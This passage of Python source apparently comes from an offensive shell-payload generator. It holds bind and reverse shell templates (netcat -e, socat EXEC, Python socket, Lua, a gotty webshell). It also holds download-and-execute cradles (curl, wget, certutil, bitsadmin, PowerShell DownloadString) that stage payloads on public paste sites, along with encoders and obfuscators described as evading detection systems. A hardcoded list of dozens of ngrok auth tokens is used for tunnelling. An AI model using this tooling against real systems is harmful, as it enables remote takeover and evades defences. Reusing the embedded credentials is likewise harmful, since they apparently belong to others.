                "lua-linux": '''{binary_name} -e "require('socket');require('os');t=socket.tcp();t:connect('{host}','{port}');os.execute('{shell_path} -i <&3 >&3 2>&3');"''',
            },
        },
        "bind": {
            "netcat": {
                "nc-e": "{binary_name} -Lnp {port} -e {shell_path}{nc_args}",
                "ncat-e": "ncat -lnp {port} -e {shell_path}{ncat_args}",
                "ncat-ssl": "ncat -lnp {port} -e {shell_path} --ssl",
                "DotnetCat": "dncat -lp {port} -e {shell_path}",
            },
            "socat": {
                "socat": "{binary_name} -d -d {protocol}4-LISTEN:{port} EXEC:'{shell_path}'{socat_args}",
                "socat-ssl": "{binary_name} OPENSSL-LISTEN:{port},cert=bind.pem,verify=0,fork EXEC:'{shell_path}'{socat_args}",
            },
            "python": {
                "python-bind": '''{binary_name} -c "import subprocess as u;c=__import__('socket').socket();c.bind(('{host}',{port}));c.listen(0);cc,a=c.accept();p=u.Popen(['{shell_path}'],stdin=u.PIPE,stdout=u.PIPE,stderr=u.STDOUT);r=__import__('threading').Thread(target=lambda:[cc.send(p.stdout.read(1024)) for _ in iter(int,1)],);r.start();[p.stdin.flush() for _ in iter(int, 1) if p.stdin.write(cc.recv(1024))]"''',
                "pwncat": "pwncat -l {host} {port} -e {shell_path}{pwncat_args}",
            },
            # gotty args
            # --url [value] Specify string for the URL
            # -c user:pass  Credential for Basic Authentication (ex: user:pass, default disabled)
            # ---all Turn on all features: download /, upload /, api, regeorg, ... (default: false)
            # -r Add a random string to the URL(default: false)
            # --api Enable API for executing commands on the system
            # --regeorg Enable socks4/socks5 proxy using regeorg (default: false)
            "golang": {
                "gotty-webshell": "gotty {gotty_args}-w --reconnect {shell_path}"
            }
        }
    }

    payloads_dict = {}
    # format payload
    nc_args = ncat_args = pwncat_args = socat_args = gotty_args = ""
    if "windows" in platform:
        socat_args = ",pipes"

    try:
        if protocol.lower() == "udp":
            nc_args = ncat_args = pwncat_args = " -u"
        elif protocol.lower() == "https" or encryption == "ssl":
            ncat_args = " --ssl"
    except AttributeError:
        pass

    if shell_type == "bash" and protocol.lower() not in ["tcp", "udp"]:
        protocol = "tcp"

    # Mapping shell type to binary name
    binary_names = {"netcat": "nc", "nodejs": "node", "golang": "go"}
    if not binary_name:
        if shell_type in binary_names:
            for i, j in binary_names.items():
                if shell_type == i:
                    binary_name = j
        else:
            binary_name = shell_type

            # format payload
    if direction in templates and shell_type in templates[direction]:
        for name, payload in templates[direction][shell_type].items():
            if dec_ip and name not in ["ncat", "ncat-c"]:
                host = dec_ip
            plain_payload = payload.format(shell_path=shell_path, protocol=protocol, host=host,
                                           port=port, port2=port2, socat_args=socat_args,
                                           binary_name=binary_name,
                                           nc_args=nc_args, ncat_args=ncat_args, pwncat_args=pwncat_args,
                                           gotty_args=gotty_args)
            payloads_dict[name] = plain_payload

    # encode payload
    if encoder:
        for name, payload in payloads_dict.items():
            for i in encoder:
                # check list: if any(x in self.shell_type for x in ["python", "powershell"]):
                if i not in ["", "url"]:
                    payload = PayloadEncoder(shell_type, platform, i, payload, shell_path)
                payloads_dict[name] = payload

    # Staging payload
    if staging_url:
        wrapper = PayloadWrapper()
        staged_payload_dict = wrapper.staging(platform, payloads_dict, shell_path, staging_url, staging_cmd)
        if staged_payload_dict is not None:
            payloads_dict.update(staged_payload_dict)
        else:
            # retry
            randnum = __import__('random').choice([i for i in range(0, 9) if i != staging_url])
            staged_payload_dict = wrapper.staging(platform, payloads_dict, shell_path, randnum, staging_cmd)
            if staged_payload_dict is not None:
                payloads_dict.update(staged_payload_dict)
    # obfuscate
    if obfuscator:
        for name, payload in payloads_dict.items():
            obf_payload = Obfuscator().obf(payload, obfuscator, platform)
            payloads_dict[name] = obf_payload
    # URL Encode
    if encoder and "url" in encoder:
        payloads_urlencoded_dict = {}
        for name, payload in payloads_dict.items():
            url_payload = PayloadEncoder.url(payload)
            payloads_urlencoded_dict[name] = url_payload
        payloads_dict.update(payloads_urlencoded_dict)

    # Get payload size
    payloads_size_dict = {}
    for name, payload in payloads_dict.items():
        if payload:
            payload_size = str(len(payload))
            if output or len(payload) > 8192 and not web:
                import os
                directory = "./rcx_results/"
                filename = name + "-" + str(len(payload)) + "-" + "payload.txt"
                filepath = os.path.abspath(os.path.join(directory, filename))
                try:
                    if not os.path.isdir(directory):
                        os.mkdir(directory)
                    with open(filepath, "wb") as outfile:
                        outfile.write(payload.encode("utf-8"))
                    if output:
                        payload = "Payload is saved in \033[1;37m" + filepath + "\033[0m"
                    else:
                        payload = "The payload is too large, has been written to \033[1;37m" + filepath + "\033[0m"
                except Exception as e:
                    print("Directory or File can not be created!")
                    print(get_traceback(e))
                    pass
            payloads_size_dict[name + "(size:" + payload_size + ")"] = payload
    payloads_dict = payloads_size_dict

    # Generate Payloads Attribute Title
    try:
        port = int(port)
        if port >= 65536:
            port = port - 65536
            conn_info = host + ":" + str(port)
    except (TypeError, ValueError):
        pass

    encoder_info = str(encoder) if encoder else None
    title = ""
    try:
        if shell_type == binary_name:
            shell_info = shell_type + ":" + shell_path
        else:
            shell_info = shell_type + ":" + shell_path + ":" + binary_name

        staging_info = "Staged" if staging_url else None
        title = list(filter(None, [conn_info, shell_info, encoder_info, ip_obfuscator, obfuscator, staging_info,
                                   direction, protocol.upper(), interactive_mode, encryption, platform]))
    except TypeError:
        pass

    return title, payloads_dict


_thread_target_key, _thread_args_key, _thread_kwargs_key = (
    ('_target', '_args', '_kwargs')
    if __import__('sys').version_info >= (3, 0) else
    ('_Thread__target', '_Thread__args', '_Thread__kwargs')
)


class ThreadWithReturn(__import__('threading').Thread):
    def __init__(self, *args, **kwargs):
        super(ThreadWithReturn, self).__init__(*args, **kwargs)
        self._return = None

    def run(self):
        target = getattr(self, _thread_target_key)
        if target is not None:
            self._return = target(
                *getattr(self, _thread_args_key),
                **getattr(self, _thread_kwargs_key)
            )

    def join(self, *args, **kwargs):
        super(ThreadWithReturn, self).join(*args, **kwargs)
        return self._return


def tunnel(protocol=None, port=None, _dir=None, loc=None):
    ngrok_conf = {
        "token": ["1pqNPomgd8IS4MEVD5ixWqbynci_7qPUV8PQ9bZhDhR23gvBq",
                  "1qkMMduBOzDEEZgbvTVUmiF7B88_2cnTe8GN5Y5NKEnf3v96v",
                  "1qkMTtorRJtQDjKaDHgDBhVqxM0_5MRgzGZYWsj3erkEofNzP",
                  "1qkMaSjkfmgny4tdNGhw8CEltWL_xNoKtdnwNyghiFPggPPK",
                  "1qkMiQpj3dP83wslTIrpVeFPc2P_2JedvtPZP9tgEL8TRUZY7",
                  "1qy8l5CLlOReT6tdDQiLxjyP90t_5A2Mc1aDaMrRkgrJPrkr1",
                  "1qy8z9ocvupU4tvUkE5kqkqcsZV_85J6MPTGcS4Rggdis1pcp",
                  "1qy94dBcvwd374dgP193PgICJSA_PKeJNMeNVNpNcUB7bF5h",
                  "1qy9GGSEPceSauamoSkkNh33rt6_4wuUew44A9AUA11smYA73",
                  "1qy9LEnNIg8flHTCKTxlQa8WTh8_5bAiVqS8HRjde2wJFrqBv",
                  "1qy9b5E3lum6PNHdm1Qulr6FD2k_5hiMUc4JFXwZqQ9ikNa4D",
                  "1qy9fbkr6sXDsezmNu4cfOPxF7E_4geScFHCAeBMsPD3hkyPm",
                  "1qy9UWz7N5bH7Ca7W8tsdKMUTiP_3Mv3HxQdXtaEjb7wrrc2Z",
                  "5S28rBKgc22ZW7evyedNT_YvEm15RZSHdXgS4QwYbk",
                  "9AZ7RJuLDUAqTz8XLZE5_6ts5kTWCvvE5o5BdT5jyE",
                  "46BUGD4XhUPTaHq7XJBwv_7e1PZUn5Qm6Z2735i64UN",
                  "1hpf39YX2qCXqAkMMcRLC0L4ww9_2VWg1CdHXGjcgnoJH2qEf",
                  "1UqHsShi6o3ketf426P5UtVdTfs_5XFD6sFRMkryka8fAbLd3",
                  "LsVZFxFqgxA4h7ibWV9V_iuA9afbQwaSnGqH9dApL",
                  "1hvRf0LvwuAI0SoCfB5J0Cnz02c_qY8Pfk5HRkxqgZ8UFHdg",
                  "4rYuvATyw19Cmk3yuxJDe_4SssNTEb27EE1U4es17pJ",
                  "1PxZ5EqEBmPYYxU7lbUYCRNdJlg_5DewYd2sVASo8ZdkmAjoU",
                  "1PCjTlVFtehbP0GW82CHfXHqps8_QmreDNWDUTwtH2UcD75k",
                  "7uG3wZjvvSXZYMW36LYe3_4hRc6nbzby7aR42FMZuuU",
                  "1hdFJmQC6iIak1eSbqx1t7Rrx56_2JLpasDVHybBixWv7Xftm",
                  "3F3eLQRVsUG5gqVPTND3A_2vXXtPCjK3TnnEazxHE7a",
                  "5ioHp3Qr1ztsMz9adXTH7_5GF6YTpEnczVrjGvmyd6R",
                  "1gYNGCw1ZRgzRTMckejZJ68fbOe_3dFZJfLuA8tTseLCmjYWK",
                  "3GPmfV8eVwG7Y49T49j2F_5aazjk48owqKA9JJZNs4f",
                  "KuTKRosrawrDMAgX1ayq_7AAmsVSom4E6GtT18S1pn",
                  "1WRKv6pwjZ0pbjSFpmDVrB3th2d_72o6qVZRRJNHe4UBnLRDM",
                  "1iVFNceiOYs6PP0VAIJgdktetio_5qWxix3dLLsdFKptGsQs5",
                  "1X7aYWPuFKYzvewLbnNoMo71kZi_2uzbB966Q4TU5cpgNPKhy",
                  "7LE18LK8zeaDYeybp5fKP_6GNG1oHEfhTnQE7s9qpw",
                  "1Qe1IeySOQWSTnpQ3eFfr8j7Oi5_2zhanqnpZwHBhsfANd6yf",
                  "1XJNNnG8kZsPjjFmLsYNWCC0gIo_7VpBhwTcvhiuK4o2G2jbt",
                  "1XzP70k7YVrg7MMaHQWPks0Q8Za_7y6b1mTDJDmJWcuqt5qTp",
                  "1Y14GB7E4acXxWYnVTiBejgnLuV_853z7mAgaTJxE9KY3HnCW",
                  "1XkoKNLcyiPECcQfGUjrTVzN64P_7tv2YgC4DSnazyVtpCpHm",
                  "1Xc7z0uHxDoI9Ah06EQKgH61zoP_6WTPXDGvjFmcp2o7gNmqa",
                  "1qkMq4p644qXcWVwWiYv6S64ln2_u64XDeKZ9iQdLA5UjHx8",
                  "1qkMwgB5wIsj29z3dKnxFpMmrVr_3cvychXo3FofX3XNeV14G",
                  "3c4WZaxPbjeRwRibY5opU_2N4TTRKaDubtEWMeKkFXn",
                  "3fW4eXHdUN3ziCBXcahZ_3tnDdaTyLw8tKzJtKZkLp",
                  "3CqeFZQht43cG5Z2YKfyv_6aKTrgrbo1HtyRi78hRKK",
                  "1RCQwctVjSz8AIzHO6S55jm8XB8_5N6PqyZVnoN7mUVqF1yvT",
                  "1XTxsRKP8XyxvaJigX9XFXU2FvK_4dqzLxNRJHBz8A3aoPC85",
                  "3Y8YSw6bvC9CsbYeRczmt_8akMuLYA3bAUshP1NCMnW",
                  "1XSYq8gmxzNgMlYQzERmC50uBot_6qURZnj43KsYF2GWaUamm",
                  "1Q6smHt4Bzz9VEXTwj3a7p5Gdx2_5mp6ivT6N6nB3YmRHUEM3",
                  "7VJwGkCTTUubiGhgz6Gv6_5fMLganRSKj9ntdefnF5o",
                  "3VnrrXDQVHoNp9HvHFhqX_3X4JExwm6L9n6w4ppL1qy",
                  "1ShshNwfhQcyOqlMjnBDVE5X5jC_3WAmzomMHAgkunka4dSck",
                  "772yFAui6ynH9AYx29HHS_5Xcr88pHtPTQLwewv7Ctk",
                  "1T750atJi3xccndeUqJ4ewiS62o_2s6f8GUccL1qDUXTGSftN",
                  "1QUysRUo97w5mdB6sCZvTTMM0aK_3unoMs6nYd7grgCkuhbj3",
                  "5eMywZLisJNdybqpFLVgs_4XQDeF3YCMHu1Ybf7mVE6",
                  "4Cg1cEwCT7Ek89zT4VcdB_4GPAjMFgu6nhwY7SxQm94",
                  "1SGs4s9NrhxP9FRURszjL1nITSv_otcpfpb6aMVEL13u3dv1",
                  "1SuK2ukM9Z4NohoJbU9224uMzXr_6h1ABdCrJU2EviZv4RN4r",
                  "7ecmt2Kux5uYsTUHrrqGU_3W9CJnaSeSyxiwkjxNhHc",
                  "2DXURjrUhAZZNMhqN5m1F_6HHzejcfRecP8upwJnNBd",
                  "25nBYYoJhRu9FXrATlOqgfYnNl2_7nqBZeKe37hbG2dU1vAXn"],
        "loc": ["us", "eu", "ap", "au", "sa", "jp", "in"]
    }
    token = __import__('random').choice(ngrok_conf["token"])
    from pyngrok import ngrok, conf
    pyconf = conf.PyngrokConfig(config_path="./ng_conf.yml", region=loc, auth_token=token, monitor_thread=False)
    try:
        if protocol == "tcp":
            tun = ngrok.connect(port, protocol, pyngrok_config=pyconf)

        elif protocol == "file":
            tun = ngrok.connect("file://" + _dir, pyngrok_config=pyconf)

        __import__('time').sleep(1)
        try:
            url = tun.public_url
        except AttributeError:
            url = tun
    except Exception as e:
        print(e)
        pass

    return url


def cmdLineParser():
    from argparse import ArgumentParser
    parser = ArgumentParser(description=Utils().print_banner())

    parser.add_argument('-l', '--host', dest='lhost', default='127.0.0.1', type=str, metavar='',
                        help="The host address to connect to(IP or Domain name).")
    parser.add_argument('-p', '--port', dest='lport', type=int, default='44444', metavar='', help="Port to connect to.")
    parser.add_argument("-t", '--type', default='bash', type=str, metavar='',
                        choices=['bash', 'netcat', 'powershell', 'openssl', 'cshap', 'perl', 'php',
                                 'python', 'ruby', 'socat', 'java', 'nodjs', 'lua', 'golang'],
                        help="Shell type.[bash, netcat, python, php, ...]")
    parser.add_argument("-P", '--platform', type=str.lower, metavar='', default='linux',
                        choices=['windows', 'linux', 'mac', 'solaris', 'bsd'],
                        help="Operating system type.[windows, linux, mac, solaris, bsd]")
    parser.add_argument("-d", '--direction', default='reverse', type=str.lower, metavar='',
                        choices=['reverse', 'bind'],
                        help="Shell connection direction.[reverse, bind]")
    parser.add_argument("-s", "--shell-path", type=str, default='bash', metavar='',
                        help="Custom shell path. [default bash or cmd.exe]")
    parser.add_argument("-e", "--encoder", metavar='', type=str, nargs='+',
                        help="Encode the payload, Example: -e hex base64",
                        choices=['base64', 'hex', 'xor', 'gzip', 'bzip2', 'base64-c', 'hex-c', 'xor-c', 'rot13-c'])
    parser.add_argument("--obf", type=str, metavar='', choices=['replace_char', 'reverse'],
                        help="Obfuscate Payload to avoid detection systems.")
    parser.add_argument("--ip-obf", type=str, metavar='', choices=['ip2int', 'ip2oct', 'ip2hex'],
                        help="Obfuscate IP address.")
    parser.add_argument("--staging-url", metavar='', help="Use staging for shells, Choose number 0-10 or custom url")
    parser.add_argument("--staging-cmd", metavar='',
                        help="Staging binary file, Choose number 0-10 or custom. Default:curl")
    parser.add_argument("--protocol", default='tcp',
                        choices=['tcp', 'udp', 'icmp', 'dns', 'http', 'https', 'http2', 'kcp'], metavar='',
                        help="Specify the protocol type.[tcp, udp, https]")
    parser.add_argument("--tunnel", metavar='', default="",
                        choices=['ngrok_us', 'ngrok_au', 'ngrok_eu', 'ngrok_ap', 'ngrok_sa', 'ngrok_jp',
                                 'ngrok_in'],
                        help="Enable ngrok local tunnel forwarding.[ngrok_jp, ngrok_us, ...] Default:ngrok_us")
    parser.add_argument("--table", default=False, action="store_true",
                        help="Print payload in tabular format. Default:False")

    parser.add_argument('-c', '--clip', metavar='', type=int,
                        help="Copy the specified id payload to the clipboard, Example: --clip 1")
    parser.add_argument('-o', '--output', default=False, action='store_true', help="Output to file.")
    parser.add_argument("-v", '--version', action="version", version=__Version__,
                        help="print the version number and exit.")

    webGroup = parser.add_argument_group('Web Options')
    webGroup.add_argument('-w', '--web', default=False, action="store_true", help="Enable web mode")
    webGroup.add_argument('--web-host', default='127.0.0.1', metavar='', help="Web bind address")
    webGroup.add_argument('--web-port', default='80', type=int, metavar='', help="Web bind port")
    webGroup.add_argument('--web-debug', default=False, action="store_true", help="Web debug mode")

    if len(__import__('sys').argv) < 2:
        parser.print_help()
        __import__('sys').exit(0)

    return parser.parse_args()


def get_traceback(e):
    lines = __import__('traceback').format_exception(type(e), e, e.__traceback__)

    return ''.join(lines)


class PayloadWrapper:
    def __init__(self):
        self.staging_url = None
        self.shell_path = None
        self.platform = None

    def staging(self, platform=None, payloads_dict=None, shell_path=None, staging_url=None, staging_cmd=None):
        self.shell_path = shell_path
        self.platform = platform
        self.staging_url = staging_url
        staging_apis = {"0": {"url": "https://tcp.st", "api": "tcp.st:7777", "method": "socket"},
                        "1": {"url": "https://oshi.at", "api": "https://oshi.at/", "method": "put"},
                        "2": {"url": "https://temp.sh", "api": "https://temp.sh/0", "method": "put"},
                        "3": {"url": "https://p.ip.fi", "api": "https://p.ip.fi/", "method": "post"},
                        "4": {"url": "https://sicp.me", "api": "https://sicp.me/p/", "method": "post"},
                        "5": {"url": "https://transfer.sh", "api": "https://transfer.sh/0", "method": "put"},
                        "6": {"url": "https://dpaste.com", "api": "https://dpaste.com/api/v2/", "method": "post"},
                        "7": {"url": "https://termbin.com", "api": "termbin.com:9999", "method": "socket"},
                        "8": {"url": "https://p.teknik.io", "api": "https://p.teknik.io/Action/Paste",
                              "method": "post"},
                        "9": {"url": "https://www.toptal.com",
                              "api": "https://www.toptal.com/developers/hastebin/documents", "method": "post"},
                        "10": {"url": "https://paste.centos.org", "api": "https://paste.centos.org/", "method": "post"},

                        }
        headers = '''{{
                            "Connection": "keep-Alive",
                            "DNT": "1",
                            "sec-ch-ua-mobile": "?0",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
                            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "Accept": "*/*",
                            "X-Requested-With": "XMLHttpRequest",
                            "Origin": "{0}",
                            "Sec-Fetch-Site": "same-origin",
                            "Sec-Fetch-Mode": "cors",
                            "Sec-Fetch-Dest": "empty",
                            "Referer": "{1}",
                            "Accept-Language": "*"
                        }}'''

        # TEST
        # if staging_url == 3:
        #     return {"TEST": self.urlWrapper(staging_cmd, "http://test.com/test") + "|" + shell_path}
        # TEST
        data_dict = staged_payload_dict = {}
        if staging_url in staging_apis.keys():
            import json
            i = staging_url
            staging_api = staging_apis[i]["api"]
            headers = json.loads(headers.format(staging_apis[i]["url"], staging_apis[i]["url"]))
            if staging_url in ["0", "1", "2", "5", "7", "9", "11"]:
                data_dict = payloads_dict
            else:
                for name, payload in payloads_dict.items():
                    if staging_url in ["3", "4"]:
                        data_dict[name] = {"paste": payload}
                    elif staging_url in ["6", "8"]:
                        data_dict[name] = {"content": payload}
                    elif staging_url == "10":
                        data_dict[name] = {"code": payload, "submit": "submit", "lang": "text"}

            try:
                if staging_url in ["8", "10"]:
                    payload_url_dict = self.request2(staging_api, "post", headers, data_dict)
                elif staging_apis[i]["method"] == "socket":
                    host = staging_apis[i]["api"].split(":")[0]
                    port = staging_apis[i]["api"].split(":")[1]
                    payload_url_dict = self.socket(host, port, data_dict)
                else:
                    payload_url_dict = self.request(staging_api, staging_apis[i]["method"], headers, data_dict)
            except (Exception,):
                pass

            else:
                for name, payload_url in payload_url_dict.items():
                    if staging_url == "0":
                        payload_url = payload_url.split()[1]
                    elif staging_url == "1":
                        payload_url = payload_url.split("\r\n")[1].split(" ")[0]
                    elif staging_url == "3":
                        payload_url = payload_url + ".txt"
                    elif staging_url in ["4", "7"]:
                        payload_url = payload_url.replace("\n", "")
                    elif staging_url == "5":
                        payload_url = payload_url.replace(".sh/", ".sh/get/")
                    elif staging_url == "6":
                        payload_url = payload_url.replace("\n", "") + ".txt"
                    elif staging_url == "8":
                        payload_url = payload_url.replace(".io/", ".io/raw/")
                    elif staging_url == "9":
                        payload_url = "https://www.toptal.com/developers/hastebin/raw/" + json.loads(payload_url)['key']
                    elif staging_url == "10":
                        payload_url = payload_url.replace("/view/", "/view/raw/")
                    else:
                        print("test", payload_url)
                    staged_payload_dict[name] = self.urlWrapper(staging_cmd, payload_url) + "|" + shell_path
        elif staging_url == "100":
            public_url = ""
            web_dir = "./tmp_web/"
            # print([_.name for _ in threading.enumerate()])
            try:
                if "ngrok-file" not in [_.name for _ in __import__('threading').enumerate()]:
                    t = ThreadWithReturn(target=tunnel, kwargs={"protocol": "file", "_dir": web_dir[1:]},
                                         name="ngrok-file")
                    t.daemon = True
                    t.start()
                    public_url = t.join(timeout=5)
            except Exception as e:
                print(get_traceback(e))
                pass

            try:
                import os
                if not os.path.isdir(web_dir):
                    os.mkdir(web_dir)
                filename = 0
                for name, payload in payloads_dict.items():
                    filename += 1
                    filepath = os.path.abspath(os.path.join(web_dir, str(filename)))
                    with open(filepath, "wb") as o:
                        o.write(payload.encode("utf-8"))
                    staging_url = str(public_url) + '/' + str(filename)
                    staged_payload_dict[name] = self.urlWrapper(staging_cmd, staging_url) + "|" + shell_path
            except Exception as e:
                print(get_traceback(e))
                pass

        else:
            for name, payload_url in payloads_dict.items():
                staged_payload_dict[name] = self.urlWrapper(staging_cmd, staging_url) + "|" + shell_path

        return staged_payload_dict

    def urlWrapper(self, staging_cmd=None, payload_url=None):
        staging_cmds = {
            "0": {"name": "curl", "platform": "*", "binary": "curl", "args": " {0}",
                  "description": "Download remote files"},
            "1": {"name": "wget", "platform": "*", "binary": "wget", "args": " -qO- {0}", "description": ""},
            "2": {"name": "jrunscript", "platform": "*", "binary": "jrunscript", "args": '''-e "cp('{0}')"''',
                  "description": ""},
            "3": {"name": "bitsadmin", "platform": "windows", "binary": "bitsadmin.exe",
                  "args": " /transfer n {0} %cd%\\0&&powershell gc 0",
                  "description": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"},
            "4": {"name": "certutil", "platform": "windows", "binary": "certutil.exe",
                  "args": "certutil -urlcache -split -f {0} cd.bat|cd.bat",
                  "description": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"},
            "5": {"name": "powershell-Invoke-WebRequest", "platform": "windows", "binary": "powershell.exe",
                  "args": ''' (IWR '{0}').Content''',
                  "description": "only windows"},
            "6": {"name": "powershell-curl", "platform": "windows", "binary": "powershell.exe",
                  "args": ''' (curl {0}).content''',
                  "description": "only windows"},
            "7": {"name": "powershell-wget", "platform": "windows", "binary": "powershell.exe",
                  "args": ''' (wget {0}).content''',
                  "description": "only windows"},
            "8": {"name": "powershell-bitstransfer", "platform": "windows", "binary": "powershell.exe",
                  "args": ''' "Import-Module bitstransfer;start-bitstransfer {0} 0;gc 0"''',
                  "description": "only windows"},
            "9": {"name": "powershell-DownloadString", "platform": "windows", "binary": "powershell.exe",
                  "args": ''' (New-Object System.Net.WebClient).DownloadString('{0}')''',
                  "description": "only windows"},
            "10": {"name": "powershell-DownloadFile", "platform": "windows", "binary": "powershell.exe",
                   "args": ''' (New-Object System.Net.WebClient).DownloadFile('{0}','0');GC 0''',
                   "description": "only windows"},
            "11": {"name": "certoc.exe", "platform": "windows", "binary": "certoc.exe", "args": "-GetCACAPS {0}",
                   "description": "only Windows Server 2022"},
            "12": {"name": "GfxDownloadWrapper.exe", "platform": "windows", "binary": "GfxDownloadWrapper.exe",
                   "args": '''forfiles /p %systemroot%\\system32\\DriverStore /s /m Gfxd*.exe /C "cmd /c for %I in (@path) do echo|set /p=%~I>%tmp%\0.cmd&echo %1 %2>>%tmp%\0.cmd"&&%tmp%\0 {0}''',
                   "description": "Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path."},
            "13": {"name": "hh.exe", "platform": "windows", "binary": "HH.exe", "args": " http://some.url/script.ps1",
                   "description": "Binary used for processing chm files in Windows"},
            "14": {"name": "lwp", "platform": "*", "binary": "lwp-download ", "args": "{0}",
                   "description": "Only support http"},
            "15": {"name": "", "platform": "*", "binary": "", "args": "", "description": ""},
            "16": {"name": "", "platform": "*", "binary": "", "args": "", "description": ""},
            "17": {"name": "", "platform": "*", "binary": "curl", "args": "", "description": ""},

        }

        if staging_cmd in staging_cmds.keys():
            i = staging_cmd
            if staging_cmds[i]["platform"] == "*":
                if self.shell_path == "$BASH":
                    auto_path = "for p in `whereis -b {0}`;do $p ".format(staging_cmds[i]["binary"])
                    staged_payload = auto_path + staging_cmds[i]["args"].format(payload_url)
                else:
                    staged_payload = staging_cmds[i]["binary"] + staging_cmds[i]["args"].format(payload_url)
            elif staging_cmds[i]["platform"] == "windows" and "windows" in self.platform:
                staged_payload = staging_cmds[i]["binary"] + staging_cmds[i]["args"].format(payload_url)
            elif staging_cmds[i]["platform"] == "windows" and "windows" not in self.platform:
                staged_payload = staging_cmds["0"]["binary"] + staging_cmds[0]["args"].format(payload_url)
            else:
                staged_payload = staging_cmds[i]["binary"] + staging_cmds[i]["args"].format(payload_url)
        else:
            staged_payload = str(staging_cmd) + ' ' + str(payload_url) + '|' + self.shell_path

        return staged_payload

    @staticmethod
    def request(api=None, method=None, headers=None, data_dict=None):
        url = api
        method = method
        session = __import__('requests').Session()
        payload_url_dict = {}
        for key, data in data_dict.items():
            if method == "put":
                response = session.put(url, headers=headers, data=data, timeout=15)
                # print(response.headers)
                # logging.getLogger("requests.packages.urllib3").propagate = True
                # logging.info("request was completed in %s seconds [%s]", response.elapsed.total_seconds(),response.url)
            elif method == "post":
                response = session.post(url, headers=headers, data=data, timeout=15)
            else:
                response = session.get(url, headers=headers, timeout=15)
            # logging.info("request was completed in %s seconds [%s]", response.elapsed.total_seconds(), response.url)
            if response.status_code == 200 or 201:
                # print(response.status_code, response.url, response.text)
                payload_url = response.text
                payload_url_dict[key] = payload_url
            else:
                print(response.status_code, response.content)
        return payload_url_dict

    @staticmethod
    def request2(api=None, method=None, headers=None, payload=None):
        url = api
        method = method
        session = __import__('requests').Session()
        payload_url_dict = {}
        for key, value in payload.items():
            if method == "put":
                response = session.put(url, headers=headers, data=value, timeout=15)
                # print(response.headers)
            elif method == "post":
                response = session.post(url, headers=headers, data=value, timeout=15)
            else:
                response = session.get(url, headers=headers, timeout=15)
            # logging.info("request was completed in %s seconds [%s]", response.elapsed.total_seconds(), response.url)
            if response.status_code == 200:
                # print(response.status_code, response.url, response.text)
                result = response.url
                payload_url_dict[key] = result
            else:
                print(response.status_code, response.content)
        return payload_url_dict

    @staticmethod
    def socket(host=None, port=None, payload=None):
        import socket
        host = host
        port = int(port)
        reply = b""
        if isinstance(payload, dict):
            staged_payload_dict = {}
            for key, payload in payload.items():
                payload = payload.encode()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15)
                s.connect((host, port))
                s.sendall(payload)
                # print(s.getpeername())
                reply += s.recv(4096)
                staged_payload_dict[key] = reply.decode()
                reply = b""
                s.close()
            return staged_payload_dict

        else:
            payload = payload.encode()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.sendall(payload)
            # print(s.getpeername())
            reply += s.recv(4096)
            s.close()
            # print(reply)
            return reply.decode()

    @staticmethod
    def socket2(host=None, port=None, payload=None):
        import socket
        host = host
        port = port
        if isinstance(payload, dict):
            staged_payload_dict = {}
            for key, payload in payload.items():
                payload = payload.encode()
                reply = b""
                sock = socket.create_connection((host, port))
                sock.sendall(payload)
                sock.settimeout(1)
                while True:
                    try:
                        reply += sock.recv(4096)
                    except TimeoutError:
                        sock.close()
                        break
                staged_payload_dict[key] = reply.decode()
                return reply.decode()
        else:
            payload = payload.encode()
            reply = b""
            sock = socket.create_connection((host, port))
            sock.sendall(payload)
            sock.settimeout(1)
            while True:
                try:
                    reply += sock.recv(4096)
                except TimeoutError:
                    sock.close()
                    break
            return reply.decode()


class PayloadEncoder(object):
    def __new__(cls, shell_type=None, platform=None, encoder=None, payload=None, shell_path=None):
        self = super(PayloadEncoder, cls).__new__(cls)
        self.shell_type = shell_type
        self.platform = platform
        self.encode = encoder
        self.shell_path = shell_path
        self.payload = payload
        # Extract code
        if "-c" in encoder:
            codeRegex = __import__('re').compile(r"([\"'])(?:(?=(\\?))\2.)*?\1")
            if codeRegex.search(self.payload):
                self.payload = codeRegex.search(self.payload).group()[1:-1]

        if "base64" in encoder:
            return self.base64()
        elif "hex" in encoder:
            return self.hex()
        elif "xor" in encoder:
            return self.xor()
        elif "rot13" in encoder:
            return self.rot13()
        elif "bzip2" in encoder:
            return self.bzip2()
        elif "gzip" in encoder:
            return self.gzip()
        else:
            return payload

    def base64(self):
        payload = self.payload
        if "-c" in self.encode:
            if self.shell_type == "python":
                wrapper = '''python -c "exec(__import__('base64').b64decode('{payload}').decode())"'''
                payload = wrapper.format(payload=__import__('base64').b64encode(payload.encode()).decode())
            elif self.shell_type == "powershell":
                wrapper1 = '''powershell "Invoke-Expression([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{payload}')))"'''
                wrapper2 = '''powershell "IEX([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{payload}')))"'''
                wrapper3 = '''powershell "$executioncontext.InvokeCommand.InvokeScript([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{payload}')))"'''
                wrapper = __import__('random').choice([wrapper1, wrapper2, wrapper3])
                payload = wrapper.format(payload=__import__('base64').b64encode(payload.encode()).decode())

        else:
            if "windows" in self.platform:
                import re
                ps_regex = re.compile("^powershell\\s*(\\W+|\\W+\\w+)\\s*", re.I)
                # The raw output of echo without quotes may cause PowerShell to report an error,
                # use cmd to interpret and execute it
                if re.search("^echo\\s", payload, re.I) and not re.match("^echo\\s*[\"|']", payload, re.I):
                    payload = payload.replace("\"", "\"\"")
                    payload = "cmd /c \"" + payload + "\""

                # Prevent powershell from nesting errors and only encode powershell code
                if ps_regex.search(payload) and "\"" in payload:
                    payload = re.search(r"([\"'])(?:(?=(\\?))\2.)*?\1", payload).group()[1:-1] + "|" + self.shell_path

                payload = "powershell /e " + __import__('base64').b64encode(payload.encode('UTF-16-LE')).decode()
            else:
                base64Wrapper = "echo {0}|base64 -d|{1}"
                payload = base64Wrapper.format(
                    __import__('base64').b64encode(self.payload.encode("utf8")).decode("utf8"),
                    self.shell_path)
